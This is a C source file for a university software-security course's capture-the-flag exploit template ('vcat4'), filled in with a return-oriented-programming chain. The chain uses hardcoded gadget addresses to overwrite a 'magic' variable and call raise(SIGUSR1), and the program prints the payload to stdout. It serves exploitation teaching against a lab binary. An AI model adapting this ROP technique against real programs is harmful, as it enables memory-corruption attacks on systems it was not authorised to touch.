/*
 * CTF-3 `vcat4' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

// Some addresses to remember:
// rnd1: 0x0c88a004
// rnd2: 0x0c88a008
// mgk1: 0x0c88b008
// mgk2: 0x0c88b00c

// pop the address of rnd1 (ebx)
// pop the address of rnd2 (edx)
// Write the value of rnd1 into register (ebx)
// Write the value of rnd2 into register (edx)
// Add both of them into ebx
// pop the address of mgk2 into edx
// Move ebx into edx
// Invoke raise in .plt

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	"\x1e\x90\x04\x08"		// Address of pop ebx gadget (0x0804901e)
	"\x04\xa0\x88\x0c"		// Address of rnd1
	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
	"\x08\xa0\x88\x0c"		// Address of rnd2
	"\x28\x71\x88\x0c"		// Address of mov [ebx] into ebx (0x0c887128)
	"\x58\x71\x88\x0c"		// Address of mov [edx] into edx (0x0c887158)
	"\x68\x71\x88\x0c"		// Address of add edx to ebx (0x0c887168)
	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
	"\x0c\xb0\x88\x0c"		// Address of mgk2
	"\x48\x71\x88\x0c"		// Address of mov ebx to [edx] (0x0c887148)
	"\x30\x90\x04\x08"		// Address of raise in .plt (0x08049030)
	"\xef\xbe\xad\xde"		// DEADBEEF (extra return address)
	"\x0c\x00\x00\x00";		// SIGUSR1
	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
